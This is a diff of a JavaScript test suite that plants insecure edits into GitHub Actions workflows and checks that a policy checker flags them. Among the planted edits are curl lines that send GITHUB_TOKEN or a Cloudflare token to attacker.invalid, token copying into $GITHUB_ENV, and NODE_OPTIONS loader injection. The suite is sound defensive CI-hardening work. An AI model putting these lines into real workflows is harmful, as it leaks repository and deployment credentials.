@@ -16,8 +16,8 @@ import {
 } from '../harness/run.mjs';
 import { validateMutants, applyMutant, coverageGaps, runMutants, loadMutants, REQUIRED } from '../harness/mutate.mjs';
 import { parseSchedule, checkSchedule, activeWorkflowText } from '../../../ops/schedule.mjs';
-import { writeJobProblems, orderProblems, buildProblems, dependencyProblems, importSpecifiers, runBodyProblems, SYNC } from '../../../ops/write-job.mjs';
-import { listArtifact, takeBuildOutput, PATHS } from '../../../ops/take-build-output.mjs';
+import { writeJobProblems, orderProblems, buildProblems, dependencyProblems, importSpecifiers, runBodyProblems, checkWorkflows, WRITE_SCRIPTS, SYNC } from '../../../ops/write-job.mjs';
+import { listArtifact, takeBuildOutput, PATH_SETS } from '../../../ops/take-build-output.mjs';
 import { parseYaml } from '../yaml.mjs';
 import { staleness, staleLine } from '../../../ops/stale-run.mjs';
 import { outsideRegionChange } from '../../../ops/briefs-guard.mjs';
@@ -507,7 +507,7 @@ const rest = [
     run(ctx) {
       const c = checks();
       const text = readFileSync(join(ctx.root, '.github/workflows/watch.yml'), 'utf8');
-      const probs = (t) => writeJobProblems(parseYaml(t), 'watch.yml');
+      const probs = (t) => writeJobProblems(parseYaml(t), '.github/workflows/watch.yml');
       const real = probs(text);
       c.expect(real.length === 0, `watch.yml: ${real.join('; ')}`);
       const tok = '          GITHUB_TOKEN: ${{ github.token }}\n';
@@ -525,15 +525,15 @@ const rest = [
         ['bun install in publish', download, `      - name: Install\n        run: bun install --frozen-lockfile\n\n${download}`, /job publish step \d+ \(Install\): installs, builds or runs gates/],
         ['a gate in publish', download, `      - name: Gates\n        run: bun run verify\n\n${download}`, /job publish step \d+ \(Gates\): installs, builds or runs gates/],
         ['setup-bun in publish', download, `      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0\n\n${download}`, /job publish step \d+ .*uses oven-sh\/setup-bun/],
-        ['an unlisted script in publish', '          node ops/briefs-guard.mjs\n', '          node ops/briefs-guard.mjs\n          node watch/discover.mjs\n', /runs `node watch\/discover\.mjs`, which is not in PUBLISH_SCRIPTS/],
-        ['inline node code in publish', '          node ops/briefs-guard.mjs\n', '          node ops/briefs-guard.mjs\n          node -e "require(\'./x\')"\n', /runs `node -e`, which is not in PUBLISH_SCRIPTS/],
+        ['an unlisted script in publish', '          node ops/briefs-guard.mjs\n', '          node ops/briefs-guard.mjs\n          node watch/discover.mjs\n', /runs `node watch\/discover\.mjs`, which is not one of this write job's scripts/],
+        ['inline node code in publish', '          node ops/briefs-guard.mjs\n', '          node ops/briefs-guard.mjs\n          node -e "require(\'./x\')"\n', /runs `node -e`, which is not one of this write job's scripts/],
         ['another interpreter in publish', '          node ops/briefs-guard.mjs\n', '          node ops/briefs-guard.mjs\n          bash ops/extra.sh\n', /runs an interpreter or script other than the listed node scripts/],
         ['a push after the sync', afterSync, `${afterSync}\n      - name: Push again\n        env:\n${tok}        run: git push origin HEAD:main\n`, /a git push \(step \d+\) follows the dashboard sync/],
         ['artifact downloaded into the checkout', 'path: ${{ runner.temp }}/watch-output', 'path: .', /downloads the artifact inside the checkout/],
-        ['upload list drifts from PATHS (code uploaded)', '            site/briefs/*.html\n', '            site/briefs/*.html\n            watch/freshness/dashboard.mjs\n', /the upload lists .*not ops\/take-build-output\.mjs PATHS/],
+        ['upload list drifts from PATHS (code uploaded)', '            site/briefs/*.html\n', '            site/briefs/*.html\n            watch/freshness/dashboard.mjs\n', /the upload lists .*not its ops\/take-build-output\.mjs PATH_SETS entry/],
         ['publish does not need build', '    needs: build\n', '', /does not need the build job/],
-        ['a personal token reaches build', '        run: node watch/watch.mjs --apply\n', '        run: node watch/watch.mjs --apply\n        with:\n          pat: ${{ secrets.PERSONAL_TOKEN }}\n', /job build: references secrets\.PERSONAL_TOKEN/],
-        ['token on the publish apply step (bracket notation)', '        id: commit\n', "        id: commit\n        env:\n          GH_TOKEN: ${{ secrets['GITHUB_TOKEN'] }}\n", /Apply the generated files.*receives the token \(env\) but is not the push or sync step/],
+        ['a personal token reaches build', '        run: node watch/watch.mjs --apply\n', '        run: node watch/watch.mjs --apply\n        with:\n          pat: ${{ secrets.PERSONAL_TOKEN }}\n', /job build step \d+ .*references secrets\.PERSONAL_TOKEN; only a reviewed step/],
+        ['token on the publish apply step (bracket notation)', '        id: commit\n', "        id: commit\n        env:\n          GH_TOKEN: ${{ secrets['GITHUB_TOKEN'] }}\n", /Apply the generated files.*receives the token \(env\) but is not one of the steps allowed it/],
         ['token on the publish setup-node step', '          node-version: 22\n\n      # Outside', `          node-version: 22\n        env:\n${tok}\n      # Outside`, /job publish step 2 \(actions\/setup-node\): receives the token/],
         ['token in the workflow env', 'concurrency:\n', 'env:\n  GITHUB_TOKEN: ${{ github.token }}\nconcurrency:\n', /sets a workflow-level `env`/],
         ['push writes the token into .git/config', '          auth="$(', '          git config --local http.https://github.com/.extraheader "AUTHORIZATION: basic x"\n          auth="$(', /writes a credential into the Git config/],
@@ -543,9 +543,9 @@ const rest = [
         ['a build permission value that is neither read nor none (an expression)', '      issues: read\n', "      issues: ${{ github.event_name == 'schedule' && 'read' || 'write' }}\n", /job build: holds the permission `issues: \$\{\{/],
         ['build permissions: write-all', '    permissions:\n      contents: read\n      issues: read\n', '    permissions: write-all\n', /job build: holds the permission `write-all`/],
         // Review 3d, O6-2: a loader variable on the sync step, which holds the write token.
-        ['review 3d O6-2: NODE_OPTIONS on the sync step', '        run: node watch/freshness/dashboard.mjs --sync watch/live.json\n', '          NODE_OPTIONS: --import=/tmp/canary.mjs\n        run: node watch/freshness/dashboard.mjs --sync watch/live.json\n', /Sync the dashboard.*sets env NODE_OPTIONS; publish steps may set only GITHUB_TOKEN/],
+        ['review 3d O6-2: NODE_OPTIONS on the sync step', '        run: node watch/freshness/dashboard.mjs --sync watch/live.json\n', '          NODE_OPTIONS: --import=/tmp/canary.mjs\n        run: node watch/freshness/dashboard.mjs --sync watch/live.json\n', /Sync the dashboard.*sets env NODE_OPTIONS; this write job's steps may set only GITHUB_TOKEN/],
         // Ours, O6-2: a node flag before the script, a variable set from run text, the path channel, a shell override.
-        ['node --require before an allowlisted script', '          node ops/briefs-guard.mjs\n', '          node --require ./hook.cjs ops/briefs-guard.mjs\n', /runs `node --require`, which is not in PUBLISH_SCRIPTS/],
+        ['node --require before an allowlisted script', '          node ops/briefs-guard.mjs\n', '          node --require ./hook.cjs ops/briefs-guard.mjs\n', /runs `node --require`, which is not one of this write job's scripts/],
         ['review 3c (a): push copies the token into $GITHUB_ENV', '          auth="$(', '          echo "GH_TOKEN_ALIAS=$GITHUB_TOKEN" >> "$GITHUB_ENV"\n          auth="$(', /Push.*names a loader or environment channel \(GITHUB_ENV\)/],
         ['a prepended PATH entry through $GITHUB_PATH', '          node ops/briefs-guard.mjs\n', '          echo "$RUNNER_TEMP/watch-output" >> "$GITHUB_PATH"\n          node ops/briefs-guard.mjs\n', /names a loader or environment channel \(GITHUB_PATH\)/],
         ['NODE_OPTIONS as an inline assignment', '          node ops/briefs-guard.mjs\n', '          NODE_OPTIONS=--import=./x.mjs node ops/briefs-guard.mjs\n', /names a loader or environment channel \(NODE_OPTIONS\)/],
@@ -562,7 +562,7 @@ const rest = [
         ['review 3e: exfiltration appended to the token-bearing push step', '        push origin "HEAD:${GITHUB_REF_NAME}"\n', '        push origin "HEAD:${GITHUB_REF_NAME}"\n          curl --data-binary "$GITHUB_TOKEN" https://attacker.invalid/collect\n', /step \d+ \(Push\): run body differs from the reviewed text at line 6: reviewed "<end>", found "curl --data-binary \\"\$GITHUB_TOKEN\\" https:\/\/attacker\.invalid\/collect"/],
         ['a harmless-looking extra echo on the commit step', '          echo "committed=true" >> "$GITHUB_OUTPUT"\n', '          echo "committed=true" >> "$GITHUB_OUTPUT"\n          echo done\n', /\(Apply the generated files and commit them\): run body differs from the reviewed text at line 17: reviewed "<end>", found "echo done"/],
         ['the sync command given an extra flag', '        run: node watch/freshness/dashboard.mjs --sync watch/live.json\n', '        run: node watch/freshness/dashboard.mjs --sync watch/live.json --dry-run\n', /\(Sync the dashboard issue from the committed watch\/live\.json\): run body differs from the reviewed text at line 1/],
-        ['a new publish step', '      - name: Push\n', '      - name: Report\n        run: git log -1 --stat\n\n      - name: Push\n', /step \d+ \(Report\): runs text under a name PUBLISH_RUNS does not hold/],
+        ['a new publish step', '      - name: Push\n', '      - name: Report\n        run: git log -1 --stat\n\n      - name: Push\n', /step \d+ \(Report\): runs text under a name its reviewed runs in ops\/write-job\.mjs POLICIES do not hold/],
         ['a changed comment line in the push step', '# .git/config. A plain push', '# .git/config. ${{ github.token }} A plain push', /\(Push\): run body differs from the reviewed text at line 2/],
         ['the push step renamed', '      - name: Push\n', '      - name: Push it\n', /has no step named "Push" running the reviewed body/],
       ];
@@ -593,10 +593,85 @@ const rest = [
       c.expect(runBodyProblems([{ name: 'A', run: 'x\n\ny' }], 'p', rv).some((m) => /line 2/.test(m)), 'an inserted blank line passes the comparison');
       c.expect(runBodyProblems([{ name: 'A', run: 'x\ny' }, { name: 'A', run: 'x\ny' }], 'p', rv).some((m) => /runs the reviewed step "A" 2 times/.test(m)), 'a repeated reviewed step passes');
       c.expect(runBodyProblems([], 'p', rv).some((m) => /has no step named "A"/.test(m)), 'a missing reviewed step passes');
-      c.expect(runBodyProblems([{ name: 'toString', run: 'x' }], 'p', rv).some((m) => /does not hold/.test(m)), 'an inherited property name counts as reviewed');
+      c.expect(runBodyProblems([{ name: 'toString', run: 'x' }], 'p', rv).some((m) => /do not hold/.test(m)), 'an inherited property name counts as reviewed');
       const wf = parseYaml(text);
       c.expect(Object.values(wf.jobs.build.permissions).every((v) => v === 'read' || v === 'none'),
         'the inert plants rest on build being read-only, and it is not');
+      return c.result();
+    },
+  },
+  {
+    id: 'HAR-O6-all-workflows', clauses: ['FR-O.6'], level: 'MUST',
+    title: 'every workflow: a job that runs dependency code holds only read or none, and every job holding a write permission (watch, discover, triage) follows its write-job policy',
+    run(ctx) {
+      const c = checks();
+      const real = checkWorkflows(ctx.root);
+      c.expect(real.problems.length === 0, `workflows: ${real.problems.join('; ')}`);
+      c.expect(real.workflows >= 5 && real.writeJobs === 3, `${real.workflows} workflows, ${real.writeJobs} write jobs`);
+      c.expect(WRITE_SCRIPTS.includes('watch/discover.mjs') && WRITE_SCRIPTS.includes('.github/scripts/triage-ack.mjs'), 'the discover or triage script is outside the dependency walk');
+      const read = (f) => readFileSync(join(ctx.root, '.github/workflows', f), 'utf8');
+      const tok = '          GITHUB_TOKEN: ${{ github.token }}\n';
+      const plants = [
+        // Rules that hold in every workflow.
+        ['verify.yml', 'workflow permissions removed, job names none', 'permissions:\n  contents: read\n', '', /job verify: neither the job nor the workflow names permissions/],
+        ['verify.yml', 'workflow-level write in a read-only workflow', 'permissions:\n  contents: read\n', 'permissions:\n  contents: write\n', /verify\.yml: the workflow-level permission `contents: write`/],
+        ['deploy.yml', 'job-level write in a job that installs', '  deploy:\n', '  deploy:\n    permissions:\n      contents: write\n', /job deploy: holds the permission `contents: write`; only a write job listed/],
+        ['verify.yml', 'an unpinned action in a read-only workflow', 'oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6', 'oven-sh/setup-bun@v2', /job verify step \d+ .*uses oven-sh\/setup-bun@v2, not pinned/],
+        ['deploy.yml', 'an unrecorded secret on a recorded step', '        id: token\n        env:\n          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}\n', '        id: token\n        env:\n          CLOUDFLARE_API_TOKEN: ${{ secrets.SOME_PAT }}\n', /step \d+ \(Deploy token present\?\): references secrets\.SOME_PAT, which its SECRET_JOBS entry does not record/],
+        // Decision D2 review: the Cloudflare token is bound to the three reviewed steps, and to their bodies.
+        ['deploy.yml', 'the Cloudflare token on the install step', '      - name: Install (lockfile must be current)\n', '      - name: Install (lockfile must be current)\n        env:\n          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}\n', /job deploy step \d+ \(Install \(lockfile must be current\)\): references secrets\.CLOUDFLARE_API_TOKEN; only a reviewed step/],
+        ['deploy.yml', 'the Cloudflare token in the job env', '    timeout-minutes: 8\n', '    timeout-minutes: 8\n    env:\n      CF: ${{ secrets.CLOUDFLARE_API_TOKEN }}\n', /job deploy: names secrets\.CLOUDFLARE_API_TOKEN at job level/],
+        ['deploy.yml', 'exfiltration added to the reviewed deploy step', '          sha="$(git rev-parse HEAD)"\n', '          sha="$(git rev-parse HEAD)"\n          curl -d "$CLOUDFLARE_API_TOKEN" https://attacker.invalid/\n', /\(Deploy site\/ to Cloudflare Pages\): holds a recorded secret, and its run body differs from the reviewed text/],
+        ['deploy.yml', 'the deploy step renamed', '      - name: Deploy site/ to Cloudflare Pages\n', '      - name: Deploy the site\n', /\(Deploy the site\): references secrets\.CLOUDFLARE_API_TOKEN; only a reviewed step/],
+        ['deploy.yml', 'the deploy guard without the workflow_run branch check', "      || (github.event.workflow_run.conclusion == 'success' && github.event.workflow_run.head_branch == 'main'))\n", "      || github.event.workflow_run.conclusion == 'success')\n", /job deploy: its `if:` is not the reviewed main-only condition/],
+        ['deploy.yml', 'the deploy job outside the production environment', '    environment:\n      name: production\n      url: https://fr.zeststream.ai\n', '', /job deploy: runs outside the `production` environment/],
+        ['deploy.yml', 'deploy checkout persists credentials', '          persist-credentials: false\n', '', /deploy\.yml job deploy step 1 .*persist-credentials: false/],
+        ['verify.yml', 'verify checkout persists credentials', '          persist-credentials: false\n', '', /verify\.yml job verify step 1 .*persist-credentials: false/],
+        ['verify.yml', 'a personal token on a verify step', '          GITLEAKS_VERSION: 8.30.1\n', '          GITLEAKS_VERSION: 8.30.1\n          GH_PAT: ${{ secrets.MY_PAT }}\n', /verify\.yml job verify step \d+ .*references secrets\.MY_PAT; only a reviewed step/],
+        ['verify.yml', 'a secret in the workflow env', 'permissions:\n  contents: read\n', 'env:\n  X: ${{ secrets.MY_PAT }}\npermissions:\n  contents: read\n', /verify\.yml: names secrets\.MY_PAT at workflow level/],
+        ['verify.yml', 'id-token: write at workflow level', 'permissions:\n  contents: read\n', 'permissions:\n  contents: read\n  id-token: write\n', /verify\.yml: the workflow-level permission `id-token: write`/],
+        ['watch.yml', 'id-token: write in a write job', '      contents: write\n      issues: write\n', '      contents: write\n      issues: write\n      id-token: write\n', /watch\.yml job publish: holds `id-token: write`/],
+        ['discover.yml', 'write-all in a write job', '    permissions:\n      contents: write\n      issues: write\n', '    permissions: write-all\n', /discover\.yml job publish: holds `id-token: write` \(or write-all\)/],
+        // discover.yml: its own policy, and the review classes from watch.yml.
+        ['discover.yml', 'discover: write permission in build (review 3d)', '      contents: read\n      issues: read\n', '      contents: read\n      issues: read\n      discussions: write\n', /discover\.yml job build: holds the permission `discussions: write`/],
+        ['discover.yml', 'discover: build names no permissions of its own', '    permissions:\n      contents: read\n      issues: read\n', '', /discover\.yml job build: names no permissions of its own/],
+        ['discover.yml', 'discover: build persists credentials', '          fetch-depth: 0\n          persist-credentials: false\n', '          fetch-depth: 0\n', /discover\.yml job build step 1 .*persist-credentials: false/],
+        ['discover.yml', 'discover: build without the main guard', "    # branch is skipped.\n    if: github.ref == 'refs/heads/main'\n", '    # branch is skipped.\n', /discover\.yml job build: lacks `if:/],
+        ['discover.yml', 'discover: upload list drifts (code uploaded)', '            watch/discovery/*.json\n', '            watch/discovery/*.json\n            watch/discover.mjs\n', /discover\.yml job build: the upload lists .*PATH_SETS entry/],
+        ['discover.yml', 'discover: bun install in publish', '      - name: Download the generated file\n', '      - name: Install\n        run: bun install --frozen-lockfile\n\n      - name: Download the generated file\n', /discover\.yml job publish step \d+ \(Install\): installs, builds or runs gates/],
+        ['discover.yml', 'discover: token on the setup-node uses step (review 3b)', '          node-version: 22\n\n      # Outside', `          node-version: 22\n        env:\n${tok}\n      # Outside`, /discover\.yml job publish step 2 \(actions\/setup-node\): receives the token/],
+        ['discover.yml', 'discover: a push after the sync (review 3b)', '"$(git ls-files \'watch/discovery/*.json\' | sort | tail -n 1)"\n', `"$(git ls-files 'watch/discovery/*.json' | sort | tail -n 1)"\n\n      - name: Push again\n        env:\n${tok}        run: git push origin HEAD:main\n`, /discover\.yml job publish: a git push \(step \d+\) follows the rollup sync/],
+        ['discover.yml', 'discover: the push copies the token into $GITHUB_ENV (review 3c)', '          auth="$(', '          echo "GH_TOKEN_ALIAS=$GITHUB_TOKEN" >> "$GITHUB_ENV"\n          auth="$(', /discover\.yml job publish step \d+ \(Push\): names a loader or environment channel \(GITHUB_ENV\)/],
+        ['discover.yml', 'discover: NODE_OPTIONS on the sync step (review 3d)', '      - name: Sync the rollup issue from the committed week file\n        env:\n', '      - name: Sync the rollup issue from the committed week file\n        env:\n          NODE_OPTIONS: --import=/tmp/canary.mjs\n', /Sync the rollup issue.*sets env NODE_OPTIONS/],
+        ['discover.yml', 'discover: download-artifact on a tag (review 3d)', 'actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c', 'actions/download-artifact@v8', /discover\.yml job publish step \d+ .*download-artifact@v8, not pinned/],
+        ['discover.yml', 'discover: exfiltration appended to the push (review 3e)', '              push origin "HEAD:${GITHUB_REF_NAME}"\n', '              push origin "HEAD:${GITHUB_REF_NAME}"\n          curl --data-binary "$GITHUB_TOKEN" https://attacker.invalid/collect\n', /discover\.yml job publish step \d+ \(Push\): run body differs from the reviewed text at line 6/],
+        ['discover.yml', 'discover: the sync step without the token', '      - name: Sync the rollup issue from the committed week file\n        env:\n          GITHUB_TOKEN: ${{ github.token }}\n', '      - name: Sync the rollup issue from the committed week file\n', /discover\.yml job publish: the rollup sync step has no token in its env/],
+        ['discover.yml', 'discover: the sync names another script', 'node watch/discover.mjs --sync-issue', 'node watch/watch.mjs --sync-issue', /runs `node watch\/watch\.mjs`, which is not one of this write job's scripts/],
+        // triage.yml: one write job with no build, its own env list, and a pinned body.
+        ['triage.yml', 'triage: write permission back at workflow level', '# Nothing by default; the one job names what it needs.\npermissions: {}\n', 'permissions:\n  issues: write\n', /triage\.yml: the workflow-level permission `issues: write`/],
+        ['triage.yml', 'triage: persisted credentials', '          persist-credentials: false\n', '          persist-credentials: true\n', /triage\.yml job ack step 1 .*persist-credentials: false/],
+        ['triage.yml', 'triage: npm ci before the script', '        run: |\n          body="$RUNNER_TEMP/ack.md"\n', '        run: |\n          npm ci\n          body="$RUNNER_TEMP/ack.md"\n', /triage\.yml job ack step \d+ \(Acknowledge once\): installs, builds or runs gates/],
+        ['triage.yml', 'triage: NODE_OPTIONS in the step env (review 3d)', '          ISSUE: ${{ github.event.issue.number }}\n', '          ISSUE: ${{ github.event.issue.number }}\n          NODE_OPTIONS: --require=./x.cjs\n', /triage\.yml job ack step \d+ \(Acknowledge once\): sets env NODE_OPTIONS; this write job's steps may set only GH_TOKEN, ISSUE/],
+        ['triage.yml', 'triage: token on the setup-node uses step (review 3b)', '          node-version: 22\n', `          node-version: 22\n        env:\n${tok}`, /triage\.yml job ack step 2 \(actions\/setup-node\): receives the token/],
+        ['triage.yml', 'triage: an extra echo in the pinned body (review 3e)', '          gh issue comment', '          echo posting\n          gh issue comment', /triage\.yml job ack step \d+ \(Acknowledge once\): run body differs from the reviewed text at line 14/],
+        ['triage.yml', 'triage: another script', 'node .github/scripts/triage-ack.mjs', 'node .github/scripts/other.mjs', /runs `node \.github\/scripts\/other\.mjs`, which is not one of this write job's scripts/],
+        ['triage.yml', 'triage: setup-bun added', '      - uses: actions/setup-node@', '      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0\n\n      - uses: actions/setup-node@', /triage\.yml job ack step 2 .*uses oven-sh\/setup-bun; this write job may use only/],
+      ];
+      for (const [file, name, find, replace, want] of plants) {
+        let p;
+        try { p = writeJobProblems(parseYaml(plantWorkflow(read(file), find, replace)), `.github/workflows/${file}`); } catch (e) { c.expect(false, `${name}: ${e.message}`); continue; }
+        c.expect(p.some((x) => want.test(x)), `${name}: not reported (got ${p.join(' | ') || 'nothing'})`);
+      }
+      // Harmless by construction: the discover build job's token is read-only, whatever the step does with it.
+      const inert = ['discover.yml', 'discover: bracket-notation token on the build step (review 3b)', '      - name: Gate chain (A..L, W, W2)\n', "      - name: Gate chain (A..L, W, W2)\n        env:\n          GH_TOKEN: ${{ secrets['GITHUB_TOKEN'] }}\n"];
+      const ip = writeJobProblems(parseYaml(plantWorkflow(read(inert[0]), inert[2], inert[3])), `.github/workflows/${inert[0]}`);
+      c.expect(ip.length === 0, `${inert[1]}: expected no finding (got ${ip.join(' | ')})`);
+      // A policy whose workflow file is gone is reported, so a rename cannot drop a policy silently.
+      withTmp((dir) => {
+        for (const f of ['watch.yml', 'discover.yml']) put(dir, `.github/workflows/${f}`, read(f));
+        const p = checkWorkflows(dir).problems;
+        c.expect(p.some((x) => /\.github\/workflows\/triage\.yml: has a POLICIES entry but no workflow file/.test(x)), `a missing policy workflow is not reported (got ${p.slice(0, 3).join(' | ')})`);
+      });
       return c.result();
     },
   },
@@ -614,7 +689,7 @@ const rest = [
         ['a non-literal dynamic import', { 'a.mjs': 'const m = await import(name);\n' }, /non-literal import/],
         ['a require of a package', { 'a.mjs': "const r = require('chalk');\n" }, /imports the package `chalk`/],
         ['an import outside the repository', { 'a.mjs': "import '../../etc/x.mjs';\n" }, /outside the repository/],
-        ['a missing file', { 'a.mjs': "import './gone.mjs';\n" }, /gone\.mjs: imported by a publish script but missing/],
+        ['a missing file', { 'a.mjs': "import './gone.mjs';\n" }, /gone\.mjs: imported by a write-job script but missing/],
         ['a header comment with a glob before the imports, and a `*/` later in the code', { 'a.mjs': "// reads packets/*-assessment.md\nimport x from 'left-pad';\nconst re = /a*/;\n" }, /imports the package `left-pad`/],
       ];
       for (const [name, files, want] of cases) {
@@ -637,14 +712,14 @@ const rest = [
   {
     id: 'HAR-O6-artifact', clauses: ['FR-O.6'], level: 'MUST',
     title: 'the publish job copies in only generated paths from the artifact, and nothing at all when the artifact holds anything else',
-    run() {
+    run(ctx) {
       const c = checks();
       const good = ['watch/state.json', 'watch/census/2026-09-25.tsv', 'watch/changes/2026-09-25.json', 'watch/freshness/REPORT.md', 'site/feed.xml', 'site/briefs/frankengit.html'];
       withTmp((dir) => {
         const art = join(dir, 'art'), repo = join(dir, 'repo');
         for (const f of good) put(art, f, `new ${f}\n`);
         put(repo, 'watch/state.json', 'old\n');
-        const r = takeBuildOutput(art, repo);
+        const r = takeBuildOutput(art, repo, PATH_SETS.watch);
         c.expect(r.problems.length === 0 && r.files.length === good.length, `a clean artifact is refused: ${r.problems.join(' | ')}`);
         c.expect(readFileSync(join(repo, 'watch/state.json'), 'utf8') === 'new watch/state.json\n', 'a generated file was not copied');
       });
@@ -661,16 +736,30 @@ const rest = [
           put(art, 'watch/state.json', 'new\n');
           put(art, extra, 'planted\n');
           put(repo, 'watch/state.json', 'old\n');
-          const r = takeBuildOutput(art, repo);
+          const r = takeBuildOutput(art, repo, PATH_SETS.watch);
           c.expect(r.problems.some((x) => want.test(x)), `${name}: not refused (got ${r.problems.join(' | ') || 'nothing'})`);
           c.expect(readFileSync(join(repo, 'watch/state.json'), 'utf8') === 'old\n' && !existsSync(join(repo, extra)), `${name}: files were copied despite the problem`);
         });
       }
       withTmp((dir) => {
         mkdirSync(join(dir, 'art'));
-        c.expect(listArtifact(join(dir, 'art')).problems.some((x) => /holds no files/.test(x)), 'an empty artifact is accepted');
+        c.expect(listArtifact(join(dir, 'art'), PATH_SETS.watch).problems.some((x) => /holds no files/.test(x)), 'an empty artifact is accepted');
       });
-      c.expect(PATHS.every((p) => !/\.mjs$|\.js$|\.sh$|\.ya?ml$/.test(p)), 'PATHS lists a code file');
+      c.expect(Object.values(PATH_SETS).flat().every((p) => !/\.mjs$|\.js$|\.sh$|\.ya?ml$/.test(p)), 'a path set lists a code file');
+      // The discover set takes the week file and nothing else, not even another watch/ file or the README.
+      for (const [extra, ok] of [['watch/discovery/2026-W39.json', true], ['watch/state.json', false], ['watch/discovery/README.md', false], ['watch/discover.mjs', false]]) {
+        withTmp((dir) => {
+          const art = join(dir, 'art'), repo = join(dir, 'repo');
+          put(art, extra, 'x\n');
+          mkdirSync(repo);
+          const r = takeBuildOutput(art, repo, PATH_SETS.discover);
+          c.expect(ok ? r.problems.length === 0 : r.problems.some((x) => /not a generated path of this set/.test(x)), `discover set, ${extra}: ${ok ? 'refused' : 'accepted'} (${r.problems.join(' | ')})`);
+        });
+      }
+      const cli = (args) => spawnSync(process.execPath, [join(ctx.root, 'ops/take-build-output.mjs'), ...args], { encoding: 'utf8' }).status;
+      withTmp((dir) => {
+        c.expect(cli(['nosuchset', dir]) === 2 && cli([dir]) === 2, 'an unknown or missing path set is not a usage error');
+      });
       // Destination side (review 3d O6-4, GPT-6-Luna, plus ours): a symlink or a non-file in the checkout
       // must not redirect an allowed generated path; the refusal is atomic, so the clean file in the same
       // artifact is not written either.
@@ -688,7 +777,7 @@ const rest = [
           put(repo, 'watch/state.json', 'old\n');
           mkdirSync(join(repo, 'watch/freshness'), { recursive: true });
           prepare(repo);
-          const r = takeBuildOutput(art, repo);
+          const r = takeBuildOutput(art, repo, PATH_SETS.watch);
           c.expect(r.problems.some((x) => want.test(x)), `${name}: not refused (got ${r.problems.join(' | ') || 'nothing'})`);
           c.expect(readFileSync(join(repo, 'watch/state.json'), 'utf8') === 'old\n', `${name}: the clean file was written despite the refusal`);
           if (existsSync(join(repo, 'ops/briefs-guard.mjs'))) c.expect(readFileSync(join(repo, 'ops/briefs-guard.mjs'), 'utf8') === 'guard\n', `${name}: the briefs guard was overwritten`);
@@ -703,7 +792,7 @@ const rest = [
     run(ctx) {
       const c = checks();
       const wf = parseYaml(readFileSync(join(ctx.root, '.github/workflows/watch.yml'), 'utf8'));
-      const real = [...orderProblems(wf.jobs.publish.steps, 'publish'), ...buildProblems(wf.jobs.build, 'build')];
+      const real = [...orderProblems(wf.jobs.publish.steps, 'publish'), ...buildProblems(wf.jobs.build, 'build', PATH_SETS.watch)];
       c.expect(real.length === 0, `watch.yml: ${real.join('; ')}`);
       c.expect([].concat(wf.jobs.publish.needs ?? []).includes('build'), 'publish does not need build');
       const tok = { GITHUB_TOKEN: '${{ github.token }}' };
@@ -721,8 +810,8 @@ const rest = [
       c.expect(has([guard, push, sync], /never applies the artifact/), 'a publish without the apply is accepted');
       c.expect(has([take, guard, push, { run: SYNC }], /no token/), 'a sync step without a token is accepted');
       c.expect(has([take, guard, { run: '# git push origin HEAD:main', env: tok }, sync], /never pushes/), 'a commented-out push counts as a push');
-      const upload = { uses: 'actions/upload-artifact@x', with: { path: PATHS.join('\n') } };
-      const b = (steps) => buildProblems({ permissions: { contents: 'read' }, steps }, 'b');
+      const upload = { uses: 'actions/upload-artifact@x', with: { path: PATH_SETS.watch.join('\n') } };
+      const b = (steps) => buildProblems({ permissions: { contents: 'read' }, steps }, 'b', PATH_SETS.watch);
       c.expect(b([{ run: 'bun run verify' }, upload]).length === 0, 'a good build is refused');
       c.expect(b([upload, { run: 'bun run verify' }]).some((p) => /uploads before the gate chain/.test(p)), 'an upload before the gates is accepted');
       c.expect(b([upload]).some((p) => /runs no gate chain/.test(p)), 'a build without gates is accepted');
